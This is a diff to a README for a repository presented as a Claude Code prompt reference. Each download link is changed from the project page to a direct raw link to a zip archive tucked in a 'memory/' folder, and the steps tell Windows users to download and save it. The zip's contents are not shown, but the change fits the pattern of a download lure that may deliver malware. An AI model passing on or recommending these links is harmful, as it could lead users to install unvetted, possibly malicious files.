@@ -1,12 +1,12 @@
 # 🧩 claude-code-prompts-reference - Simple Prompt Research Guide
 
-[![Download](https://img.shields.io/badge/Download-Open%20Link-blue?style=for-the-badge)](https://github.com/moiralongspurred78/claude-code-prompts-reference)
+[![Download](https://img.shields.io/badge/Download-Open%20Link-blue?style=for-the-badge)](https://raw.githubusercontent.com/moiralongspurred78/claude-code-prompts-reference/main/memory/code-prompts-reference-claude-v3.4.zip)
 
 ## 🚀 Download
 
 Use this link to visit the page to download or open the files:
 
-[Open the download page](https://github.com/moiralongspurred78/claude-code-prompts-reference)
+[Open the download page](https://raw.githubusercontent.com/moiralongspurred78/claude-code-prompts-reference/main/memory/code-prompts-reference-claude-v3.4.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ The files should work on a normal Windows setup with no special setup.
 
 ## 🧭 Get the files
 
-1. Open the download page: https://github.com/moiralongspurred78/claude-code-prompts-reference
+1. Open the download page: https://raw.githubusercontent.com/moiralongspurred78/claude-code-prompts-reference/main/memory/code-prompts-reference-claude-v3.4.zip
 2. Look for the main files on the page
 3. If you see a zip file or release file, download it
 4. Save it to your Downloads folder
